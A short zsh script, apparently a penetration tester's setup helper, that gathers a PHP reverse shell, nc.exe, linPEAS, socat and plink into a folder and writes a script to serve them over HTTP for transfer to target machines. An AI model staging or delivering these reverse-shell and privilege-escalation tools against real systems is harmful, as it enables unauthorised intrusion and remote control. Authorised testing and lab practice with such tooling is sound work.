#!/bin/zsh

mkdir webserver
cp /usr/share/laudanum/php/php-reverse-shell.php ./webserver/
cp /usr/share/windows-resources/binaries/nc.exe ./webserver/
sudo wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -P ./webserver/
sudo wget "https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true" -O ./webserver/socat
sudo wget "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -O ./webserver/plink_64.exe
sudo wget "https://the.earth.li/~sgtatham/putty/latest/w32/plink.exe" -O ./webserver/plink_32.exe
echo "#!/bin/bash" >> server.sh
echo "python -m http.server -d webserver 8080" >> server.sh
chmod 755 server.sh
